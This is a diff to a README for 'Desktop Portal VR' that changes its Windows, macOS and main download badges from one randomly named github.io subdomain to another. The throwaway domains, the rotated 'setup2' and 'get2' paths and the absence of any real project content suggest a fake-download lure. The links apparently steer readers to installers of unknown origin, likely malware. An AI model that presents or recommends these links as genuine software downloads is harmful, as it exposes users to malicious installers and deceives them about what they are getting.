@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Desktop Portal VR](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_DESKTOP_PORTAL_VR-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download Desktop Portal VR](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_DESKTOP_PORTAL_VR-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Desktop Portal VR** is quick and straightforward.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4527A0?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4527A0?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-4527A0?style=for-the-badge&logo=windows&logoColor=white)](https://vkbcfwqqceuz.github.io/windows-setup2/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-4527A0?style=for-the-badge&logo=apple&logoColor=white)](https://vkbcfwqqceuz.github.io/macos-get2/)
 
 </div>
 
